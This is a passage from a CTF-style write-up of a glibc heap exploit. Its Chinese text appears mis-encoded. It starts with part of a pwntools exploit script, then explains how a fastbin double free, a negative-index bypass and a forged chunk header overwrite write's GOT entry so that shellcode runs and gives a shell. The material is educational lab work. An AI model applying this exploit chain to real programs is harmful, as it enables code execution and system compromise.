	p.sendline('1')
	p.sendline(shellcode2)
	print p.recv()
	p.sendline('1')
	p.sendline(shellcode2)
	print p.recv()

def free_del():
	for x in xrange(3):
		p.sendline('3')
		p.send(str(0xfffffffd))
		print p.recv()

def create_chunk():
	for x in xrange(0x31):
		p.sendline('1')
		print p.recv()
		if x == 1:
			p.sendline(p64(0)+p64(0x21))
		else:
			p.sendline(shellcode2)
		print p.recv()

create_chunk()
print "===create over=========="
double_free()
print "====double free over===="
free_del()
print "=====del over=========="
malloc_fd()

# æ§åˆ¶chunk_number
p.sendline('1')
p.send(p64(0xffffffef))

print p.recv()

p.sendline('3')
p.send('4294967291')
print p.recv()

p.sendline('1')
p.sendline(shellcode1)

p.interactive()

```

ä¹‹å‰ç¨‹åºé‡Œå†™äº†ç¼–è¯‘æ–¹å¼ï¼Œè¿™é¢˜æˆ‘ä»¬æ˜¯å…³é—­NXçš„ï¼Œæ‰€ä»¥å°±è¦æƒ³ç€æ€ä¹ˆå¯ä»¥æ‰§è¡Œshellcode

å†è®²payloadçš„æ—¶å€™ï¼Œå…ˆæä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å…³æ³¨å‡ ä¸ªåœ°æ–¹ï¼Œä¸€ä¸ªæ˜¯å­˜æ”¾chunkåœ°å€çš„listï¼Œè¿˜æœ‰å°±æ˜¯ä½¿ç”¨libheapçš„fastbinså‘½ä»¤æŸ¥çœ‹fastbinæƒ…å†µ

payloadçš„ç¬¬ä¸€æ­¥æ˜¯`create_chunk()`å‡½æ•°ï¼Œåˆ›é€ å‡ºæœ€å¤§å€¼0x31ä¸ªchunkï¼Œchunkçš„èµ‹å€¼ä¹‹åå°±çŸ¥é“å…¶æ„ä¹‰

è¿™ä¸ªæ—¶å€™listçš„æƒ…å†µï¼š

```
list[0]
list[1]
list[2]
......
list[46]
list[47]
----overflow----
list[48]
```



ç„¶åå°±ä¼šäº§ç”Ÿ2freeäº†ï¼Œçœ‹`double_free()`ï¼Œé¦–å…ˆæ˜¯åªæœ‰free(list[47])æ“ä½œï¼Œæˆ‘ä»¬list[47]çš„å€¼ç§°ä¸ºlist47ï¼Œè¿™ä¸ªæ—¶å€™`fastbin -> list47`

ç¬¬äºŒæ¬¡æ˜¯free(list[0])ï¼Œæˆ‘ä»¬æŠŠlist[0]ç§°ä¸ºlist0ï¼Œè¿™ä¸ªæ—¶å€™

````
fastbin -> list0
list0.fd -> list47
````

ä½†æ˜¯é™¤äº†freeçš„æ“ä½œï¼Œè¿˜ä¼šè¿›è¡Œæ¸…é™¤list[0]çš„ç§»ä½æ“ä½œï¼š

```
list[0] = list[1]
list[1] = list[2]
......
list[45] = list[46]
list[46] = list[47]
```

ç„¶åæˆ‘ä»¬å†free(list[46])ï¼Œè¿™ä¸ªæ—¶å€™list[46]çš„å€¼ä¸ºlist47ï¼Œè€Œlist47æ˜¯è¢«freeè¿‡çš„ï¼Œæ‰€ä»¥å°±é€ æˆäº†double free

è¿™ä¸ªæ—¶å€™

```
fastbin -> list47
list47.fd -> list0
list0.fd -> list47
```

ç„¶åï¼Œå°±æ¶‰åŠåˆ°äº†ç¬¬äºŒä¸ªbugï¼Œ`int chunk_number;`ï¼Œchunk_numberçš„å€¼ä¸ºintï¼Œæ‰€ä»¥åœ¨free_chunkå‡½æ•°ä¸­ï¼Œid>chunk_numberçš„æ¯”è¾ƒå¯ä»¥è®©idä¸ºè´Ÿæ•°æ¥bypass

çœ‹ä¹‹åçš„payloadï¼Œfreeäº†3æ¬¡list[-3] (list[-3] == list[0xfffffffd])

```asm
.bss:0000000000602080 chunk_number    dd
.bss:0000000000602084                 align 20h
.bss:00000000006020A0                 public list
.bss:00000000006020A0 ; void *list
```

é€šè¿‡idaå¯ä»¥çœ‹åˆ°list[-3]çš„åœ°å€ä¸º0x0602088ï¼Œå€¼ä¸º0(ä¸çŸ¥é“ä¸ºå•¥listå’Œchunk_numberä¹‹é—´æœ‰28byteæ²¡è¢«ä½¿ç”¨çš„å†…å­˜)

æ‰€ä»¥æˆ‘ä»¬å®é™…æ‰§è¡Œçš„æ˜¯3æ¬¡free(0)ï¼Œè€Œè¯¥æ“ä½œå¹¶ä¸ä¼šæ”¹å˜å•¥ï¼Œæ‰€ä»¥å®é™…çš„æ•ˆæœåªæœ‰ï¼š

```
list[-3] = list[0]
list[-2] = list[1]
list[-1] = lsit[2]
......
list[44] = list[47]
list[45] = list[47]
list[46] = list[47]
```

ä½†æ˜¯å’Œåˆšæ‰§è¡Œå®Œ`create_chunk`åçš„åˆå§‹ç»“æœç›¸æ¯”ï¼Œæ˜¯è¿™æ ·çš„:

```
list[-3] = list[1]
list[-2] = list[2]
list[-1] = lsit[3]
......
list[43] = list[47]
list[44] = list[47]
list[45] = list[47]
list[46] = list[47]
```

 è¿™ä¸ªæ—¶å€™æ‰§è¡Œ`malloc_fd`å‡½æ•°ï¼Œæˆ‘ä»¬å›å¤´å†çœ‹çœ‹ç°åœ¨fastbinçš„æƒ…å†µï¼š

```
fastbin -> list47
list47.fd -> list0
list0.fd -> list47
```

æ‰€ä»¥ï¼Œç¬¬ä¸€æ¬¡mallocï¼Œæˆ‘ä»¬å¾—åˆ°çš„æ˜¯list47çš„åœ°å€ï¼Œç„¶ååœ¨list47.fdçš„ä½ç½®å†™å…¥äº†`p64(0x602080-8)`

ç¬¬äºŒæ¬¡mallocï¼Œè·å–åˆ°çš„æ˜¯list0çš„åœ°å€

ç¬¬ä¸‰æ¬¡mallocï¼Œè·å–åˆ°åˆæ˜¯list47çš„åœ°å€ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œfastbinå°†ä¼šæŒ‡å‘list47çš„fdï¼š

```
fastbin -> 0x602078
```

ä¸ºä»€ä¹ˆæˆ‘ä»¬è®©fastbinæŒ‡å‘è¿™ä¸ªåœ°å€ï¼Ÿå› ä¸ºfastbinåœ¨mallocçš„æ—¶å€™ä¼šå¯¹sizeè¿›è¡Œæ£€æŸ¥ï¼Œä¹Ÿå°±æ˜¯æ£€æŸ¥address+8çš„å€¼æ˜¯å¦ä¸ºåˆæ³•size

å¦‚æœfastbinæŒ‡å‘0x602078ï¼Œåˆ™ä¼šæ£€æŸ¥0x602080æ˜¯å¦æ˜¯åˆæ³•sizeï¼Œè¿™ä¸ªåœ°å€ä¸ºå­˜å‚¨çš„æ˜¯chunk_numberï¼Œæˆ‘ä»¬å¯ä»¥ä»”ç»†è®¡ç®—ä¸‹ï¼Œè¿™ä¸ªæ—¶å€™çš„chunk_number=0x2e(0b101110)ï¼Œæ˜¯ä¸€ä¸ªåˆæ³•çš„åœ°å€ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥æˆåŠŸmallocï¼Œè¿”å›åœ°å€0x602088ï¼Œç„¶åæ›´æ–°fastbinï¼ŒfastbinæŒ‡å‘çš„æ˜¯0x602078çš„fdï¼Œä¹Ÿå°±æ˜¯0x602088ï¼Œè¿™ä¸ªåœ°å€æ˜¯list[-3]ï¼Œ æ ¹æ®ä¸Šé¢åˆ†æçš„ï¼Œè¿™ä¸ªå€¼ä¹Ÿå°±æ˜¯åˆå§‹çš„list[1]ï¼Œæ‰€ä»¥åœ¨payloadä¸­ï¼Œæˆ‘ä»¬åœ¨è¿™ä¸ªä½ç½®å†™å…¥çš„æ˜¯`p64(0)+p64(0x21)`ï¼Œä¸ºäº†ä¹‹åèƒ½æˆåŠŸmallocæ‰€ä¼ªé€ çš„å¤´ã€‚

è¿™æ—¶çš„fastbin:

```
fastbin -> old_list1
```

ç„¶åæˆ‘ä»¬å‘0x602088å†™å…¥0x10byteçš„æ•°æ®ï¼Œæˆ‘ä»¬åœ¨è¿™ä¸ªåœ°æ–¹å†™å…¥çš„æ˜¯p64(0xffffffef)ï¼Œä¹Ÿå°±æ˜¯-17

ä¹‹åæˆ‘ä»¬å†free(list[-5]) -> free(*0x602078) -> free(0)ï¼Œ ä¸ä¼šå‘ç”Ÿå•¥ï¼Œä½†æ˜¯free_chunké™¤äº†è°ƒç”¨freeå‡½æ•°å¤–è¿˜æœ‰ä¸€ä¸ªæ“ä½œï¼š

```
list[-5] = list[-4]
list[-4] = list[-3]
......
å…¶ä¸­
list[-4] = 0x602080        
list[-3] = 0x602088
```

å…¶ä¸­0x602080ä¸ºchunk_numberçš„åœ°å€ï¼Œæ‰€ä»¥ç»è¿‡è¿™ä¸ªæ“ä½œåï¼Œchunk_numberçš„åœ°å€è¢«ä¿®æ”¹ä¸ºäº†0x602088åœ°å€çš„å€¼ï¼Œåœ¨ä¸Šé¢æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå€¼ä¸º0xffffffef

æœ€åä¸€æ­¥ï¼Œé¦–å…ˆæ˜¯chunk_numberè‡ªå¢ï¼Œå¾—åˆ°0xfffffff0

ç„¶åæ˜¯mallocè·å¾—old_list1 + 16åœ°å€ï¼Œå†™å…¥shellcode

ç„¶ååœ¨æºç ä¸­çš„æ“ä½œæ˜¯ï¼š

```
list[chunk_number] = tmp;
```

listçš„åœ°å€æ˜¯0x6020a0

chunk_numberçš„å€¼ä¸º0xfffffff0

æ‰€ä»¥æœ€åæ˜¯å‘0x6020a0 + 8*0xfffffff0 = 0x602020åœ°å€å†™å…¥old_list1 + 16(ä¹Ÿå°±æ˜¯shellcodeåœ°å€çš„å€¼)

åœ¨æˆ‘ç¼–è¯‘å‡ºæ¥çš„ç¨‹åºä¸­

```
.got.plt:0000000000602020 off_602020      dq offset write      
```

0x602020æ˜¯writeçš„gotåœ°å€ï¼Œæ‰€ä»¥ä¿®æ”¹äº†writeçš„gotè¡¨åœ°å€ä¸ºshellcodeåœ°å€

æ‰€ä»¥ä¹‹åè°ƒç”¨writeï¼Œå°†ä¼šè·³åˆ°shellcodeåœ°å€ï¼Œå› ä¸ºNXæ²¡å¼€ï¼Œæ‰€ä»¥å †æ ˆå¯æ‰§è¡Œï¼Œå¯ä»¥æˆåŠŸæ‰§è¡Œshellcodeï¼Œå¯¼è‡´getshell

PSï¼špayloadä¸­çš„shellcode2æ²¡å•¥ç”¨ï¼Œåªæ˜¯æˆ‘æµ‹è¯•æ—¶å€™ç”¨çš„ï¼Œè¿™ä¸ªç›¸å½“äºpaddingï¼Œçœ‹payloadçš„æ—¶å€™åˆ«çº ç»“è¿™ä¸ªï¼Œä¹‹å‰è¾“å…¥æœ‰æ„ä¹‰çš„ä¸€ä¸ªæ˜¯list[1]æ„é€ chunk headerï¼Œä¸€ä¸ªå°±æ˜¯æœ€åçš„shellcode1äº†ï¼Œå…¶ä»–çš„åŸºæœ¬ç®—æ˜¯padding

å‚è€ƒï¼š

1.  [malloc.c](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html)
2.  [Heap Exploitation](https://www.slideshare.net/AngelBoy1/heap-exploitation-51891400?ref=http://4ngelboy.blogspot.com/)
3.  [Understanding glibc malloc](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/)
4.  [Syscalls used by malloc](https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/)
5.  [Double Freeæµ…æ](http://static.hx99.net/static/drops/binary-7958.html)
